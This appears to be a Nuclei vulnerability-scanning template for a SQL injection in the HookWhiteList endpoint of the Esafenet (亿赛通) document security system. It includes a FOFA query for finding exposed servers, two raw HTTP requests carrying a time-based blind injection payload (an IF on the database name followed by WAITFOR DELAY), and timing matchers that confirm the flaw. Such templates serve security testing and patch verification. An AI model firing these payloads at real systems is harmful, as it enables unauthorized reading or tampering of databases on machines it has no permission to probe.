id: esafe-dlp-hookwhitelist-sql
info:
  name: 亿赛通电子文档安全管理系统HookWhiteList组件SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/CDGServer3/index.jsp"
      亿赛通电子文档安全管理系统中的HookWhiteList组件存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，在未授权情况下获取数据库敏感信息或执行任意数据库操作，导致数据泄露、篡改或系统权限丧失。该漏洞利用路径位于系统核心处理模块，建议立即应用官方安全补丁。
  tags: 亿赛通电子文档安全管理系统
http:
- raw:
  - |
    GET /CDGServer3/policy/HookWhiteList;logindojojs?command=AddHookWhiteList&policyId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
    Connection: close
  - |
    GET /CDGServer3/policy/HookWhiteList;logindojojs?command=AddHookWhiteList&policyId=1';if(db_name()='CobraDGServer')+WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
